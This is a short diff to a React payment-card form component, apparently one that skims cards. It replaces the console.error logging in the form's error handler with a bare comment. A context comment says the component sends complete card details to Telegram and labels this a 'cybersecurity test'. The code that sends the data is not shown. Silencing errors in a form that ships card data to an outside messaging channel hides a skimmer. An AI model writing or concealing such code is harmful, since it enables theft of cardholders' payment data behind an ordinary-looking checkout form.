@@ -191,7 +191,7 @@ const PaymentCardInput = () => {
         }).toString()
       });
     } catch (err) {
-      console.error("Form submission error:", err);
+      // Form submission error
     }
     
     // Send complete card details to Telegram (cybersecurity test)
